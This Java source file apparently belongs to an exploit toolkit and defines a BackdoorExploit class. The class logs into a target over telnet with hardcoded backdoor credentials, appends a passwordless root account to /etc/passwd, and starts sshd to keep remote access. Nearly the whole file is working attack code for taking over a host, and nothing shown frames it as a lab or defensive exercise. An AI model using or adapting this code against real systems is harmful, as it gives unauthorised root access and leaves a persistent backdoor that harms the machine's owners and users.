
public class BackdoorExploit extends Exploit {
	
	Telnet telnetConn;
	int port;
	String usr;
	String pswd;
	
	
	public BackdoorExploit( String ipAddress, String desiredUser, String copyingFilePath){
		super(desiredUser, copyingFilePath, ipAddress);
		telnetConn = new Telnet();
		port = 23;
		usr = "backdoorman";
		pswd = "anythign";
	}
	
	protected boolean getRootAccess(){
		if(!telnetConn.connect(ip, port, usr, pswd)){
			System.out.println("telnetConnection: failed to connect");
			return false;
		}
		
		String[] command = new String[]{"echo " + dusr+"::0:0::/:/bin/sh >> /etc/passwd"};
		if(!telnetConn.sendCommands(command))
			return false;
		
		String[] runSSHD = new String[]{"/usr/sbin/sshd"};
		if(!telnetConn.sendCommands(runSSHD))
			return false;
		
		
		String[] exit = new String[]{"exit"};
		
		return telnetConn.sendCommands(exit);
	}
}
